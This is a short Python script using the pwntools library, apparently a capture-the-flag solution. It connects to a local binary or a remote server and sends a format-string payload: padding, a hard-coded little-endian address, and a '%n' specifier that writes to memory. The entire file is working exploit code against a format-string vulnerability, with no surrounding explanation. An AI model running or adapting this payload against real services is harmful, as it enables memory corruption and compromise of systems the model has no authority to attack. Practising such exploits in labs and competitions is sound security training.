#!/usr/bin/python3
import pwn
import sys

if __name__ == '__main__':
    localMode = len(sys.argv) != 3
    attack = b"88"
    target = None

    if localMode:
        target = pwn.process(sys.argv[1])  # Use local file
    else:
        server = sys.argv[1]
        port = int(sys.argv[2])
        target = pwn.remote(server, port)  # Connect to the server
    ans = "%d %d %d %d %n".encode()
    temp = "llll".encode()
    s = (0x80e419c).to_bytes(4,byteorder='little')
    ans = temp+s+ans
    target.sendline(ans)

    print(target.recvall().decode("utf-8", "ignore").strip())
